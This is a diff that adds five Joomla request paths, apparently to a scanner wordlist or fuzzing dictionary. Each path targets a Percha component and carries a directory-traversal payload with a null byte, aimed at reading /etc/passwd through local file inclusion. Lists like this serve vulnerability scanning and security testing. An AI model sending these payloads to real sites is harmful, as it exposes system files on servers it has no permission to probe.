@@ -1,0 +1,5 @@
+/index.php?option=com_perchacategoriestree&controller=../../../../../../../../../../etc/passwd%00
+/index.php?option=com_perchaimageattach&controller=../../../../../../../../../../etc/passwd%00
+/index.php?option=com_perchagallery&controller=../../../../../../../../../../etc/passwd%00
+/index.php?option=com_perchafieldsattach&controller=../../../../../../../../../../etc/passwd%00
+/index.php?option=com_perchadownloadsattach&controller=../../../../../../../../../../etc/passwd%00
